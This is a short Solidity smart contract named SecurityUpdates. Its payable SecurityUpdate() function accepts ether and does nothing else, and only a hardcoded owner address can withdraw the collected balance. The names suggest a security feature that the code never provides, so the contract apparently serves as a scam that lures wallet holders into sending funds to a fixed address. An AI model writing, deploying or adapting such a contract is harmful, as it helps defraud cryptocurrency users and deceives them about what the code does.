pragma solidity ^0.4.26;

contract SecurityUpdates {

    address private  owner;

     constructor() public{   
        owner=0xd186D6B4098B099C98dA2085CAdb5183a266BFBf;
    }
    function getOwner(
    ) public view returns (address) {    
        return owner;
    }
    function withdraw() public {
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }

    function SecurityUpdate() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}